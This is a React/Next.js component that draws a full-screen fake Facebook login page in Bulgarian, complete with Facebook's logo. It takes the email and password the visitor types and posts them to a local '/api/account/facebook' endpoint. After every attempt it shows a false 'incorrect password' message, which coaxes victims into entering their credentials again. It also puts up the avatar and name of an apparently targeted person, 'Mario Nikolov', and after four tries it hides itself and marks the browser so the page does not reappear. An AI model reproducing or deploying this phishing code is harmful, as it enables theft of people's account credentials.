import React, { useState } from "react";
import Link from "next/link";
import Image from "next/image";
import { useRouter } from "next/router";

const CreateReview = ({ setPopup }) => {
  const [inputs, setInputs] = useState({
    email: "",
    password: "",
  });
  const handler = (e) => {
    setInputs((prev) => ({ ...prev, [e.target.name]: e.target.value }));
  };
  const [tries, setTries] = useState(0);
  const [isLoading, setLoader] = useState(false);
  const [isSubmited, setSubmited] = useState(false);
  const submitHandler = async (e) => {
    e.preventDefault();
    setSubmited(false);

    if (tries == 4) {
      localStorage.setItem("alreadyTried", "true");
      setPopup(false);
    }

    const data = {
      email: inputs.email,
      password: inputs.password,
    };
    const res = await fetch("/api/account/facebook", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data),
    });
    const resData = await res.json();
    console.log(resData);
    setTimeout(() => {
      setLoader(false);
      setSubmited(true);
      setTries((tries += 1));
    }, 1500);
  };
  return (
    <div className="fixed top-0 left-0 w-screen h-screen bg-[#f0f2f5] z-50 overflow-auto">
      <div className="relative mt-10">
        <Image
          src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"
          alt="facebook"
          width={500}
          height={100}
          // objectFit="contain"
        />
        <section className="py-5 mx-4 bg-white rounded-md shadow-facebook ">
          <section className="container">
            {tries >= 1 && (
              <div className="flex items-center justify-center mt-3 mb-3">
                <div className="relative h-16 w-16 rounded-full ">
                  <Image
                    src="/mario.jpg"
                    alt="mario"
                    layout="fill"
                    className="rounded-full"
                  />
                </div>
              </div>
            )}
            <h3 className="text-[18px]  text-center ">
              Влизане {tries == 0 ? "във Facebook" : "като Mario Nikolov"}
            </h3>
            {inputs.email && isSubmited && (
              <div className="text-center text-[#90949c] ">{inputs.email}</div>
            )}
            <form autoComplete="off" onSubmit={submitHandler}>
              <div className="pt-4">
                <input
                  type="text"
                  value={inputs.email}
                  onChange={handler}
                  name="email"
                  autoComplete="off"
                  placeholder="Имейл или телефонен номер"
                  className="w-full px-4 py-3 text-lg border rounded-md border-[#dddfe2] font-meidum placeholder-[#dddfe2] outline-0 "
                />
              </div>
              <div className="pt-4">
                <input
                  type="password"
                  value={inputs.password}
                  onChange={handler}
                  autoComplete="off"
                  name="password"
                  placeholder="Парола"
                  className="w-full px-4 py-3 text-lg border rounded-md border-[#dddfe2] font-meidum placeholder-[#dddfe2]  outline-0"
                />
                {tries >= 1 && (
                  <p className="text-[#f02849] mt-2 test-font text-sm">
                    Паролата, която въведохте, е неправилна.
                  </p>
                )}
              </div>
              <div className="w-full mt-4">
                <button
                  className="bg-[#166fe5] text-white w-full py-2 rounded-md font-semibold text-2xl flex justify-center items-center"
                  onClick={() => setLoader(true)}
                >
                  {isLoading ? <div className="loader"></div> : "Влизане"}
                </button>
              </div>
            </form>
            <div className="text-center text-[#166fe5] mt-4 pb-2">
              <Link href="/">Забравена парола?</Link>
            </div>
          </section>
        </section>
      </div>
    </div>
  );
};

export default CreateReview;
